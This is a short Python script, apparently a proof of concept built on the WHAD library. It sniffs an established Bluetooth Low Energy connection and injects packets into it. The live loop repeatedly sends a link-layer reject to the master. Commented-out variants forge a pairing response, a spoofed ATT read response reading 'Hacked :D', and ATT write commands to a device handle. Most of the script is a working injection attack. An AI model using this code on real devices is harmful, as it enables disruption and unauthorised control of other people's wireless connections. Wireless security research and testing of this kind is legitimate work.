from whad.ble import Sniffer, Injector
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from time import time,sleep
from scapy.all import BTLE_CTRL, LL_UNKNOWN_RSP,LL_REJECT_IND,  BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request, ATT_Read_Response, SM_Hdr, SM_Pairing_Response
import sys

def show(pkt):
    print(repr(pkt.metadata), repr(pkt))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            sniffer = Sniffer(dev)
            sniffer.attach_callback(show)
            sniffer.configure(advertisements=False, connection=True, empty_packets=False)
            sniffer.start()
            while not sniffer.is_synchronized():
                sleep(0.1)
            print("Press enter to inject.")
            #input()
            injector = sniffer.available_actions(Injector)[0]
            while True:
                a = injector.inject_to_master(BTLE_CTRL()/LL_REJECT_IND()) #BTLE_DATA()/L2CAP_Hdr()/SM_Hdr()/SM_Pairing_Response(iocap=3, oob=0,authentication=5, max_key_size=16, initiator_key_distribution=7, responder_key_distribution=7))
                #BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_Response(value=b"Hacked :D"))#BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x00\x0d\x0a"))
                print(a)
                print("Press enter to inject.")
                input()
                '''
                a = injector.inject_to_slave(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a"))
                print(a)
                print("Press enter to inject.")
                input()
                '''
        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
